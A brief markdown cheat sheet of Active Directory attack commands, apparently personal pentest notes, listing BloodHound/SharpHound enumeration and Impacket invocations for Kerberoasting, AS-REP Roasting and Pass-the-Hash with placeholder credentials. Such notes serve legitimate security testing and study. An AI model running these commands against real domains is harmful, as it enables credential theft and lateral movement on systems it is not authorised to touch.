# AD Attack Notes

## Enumeración
```bash
# BloodHound
bloodhound-python -d domain.local -u user -p pass -ns DC_IP

# SharpHound
.\SharpHound.exe -c All
```

## Ataques
```bash
# Kerberoasting
GetUserSPNs.py domain.local/user:pass -request

# AS-REP Roasting
GetNPUsers.py domain.local/user:pass -request

# Pass-the-Hash
psexec.py domain.local/user@target -hashes LM:NT
```
